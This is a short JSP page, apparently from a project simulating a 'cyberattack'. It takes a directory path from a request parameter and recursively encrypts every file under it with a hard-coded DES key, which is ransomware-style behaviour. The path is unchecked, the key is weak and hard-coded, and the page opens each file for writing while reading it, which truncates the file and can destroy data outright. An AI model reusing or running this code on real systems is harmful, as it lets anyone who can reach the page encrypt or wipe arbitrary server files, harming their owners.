 <%@page import="org.apache.commons.io.FileUtils"%>
<%@page import="org.apache.commons.io.filefilter.TrueFileFilter"%>
<%@page import="java.util.List"%>
<%@page import="java.io.File"%>
<%@page import="action.cyberattact"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="java.io.FileInputStream"%>
<%@page import="action.cyberattact"%>
<%
                    String vulnarab =  request.getParameter("vulnarb");
                    
                    session.setAttribute("vuln", vulnarab);
                    
                    String key = "pavihtra"; // needs to be at least 8 characters for DES
                        File dir = new File(vulnarab);
List<File> files = (List<File>) FileUtils.listFiles(dir, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);
		for (File file : files) {

			FileInputStream fis = new FileInputStream(file.getCanonicalPath());
                         
			FileOutputStream fos = new FileOutputStream(file.getCanonicalPath());
			cyberattact.doc(key, fis, fos);
                                               }
                     
                     
                     
                        response.sendRedirect("vulnarable.jsp?msg=requestsend");
                    
                    %>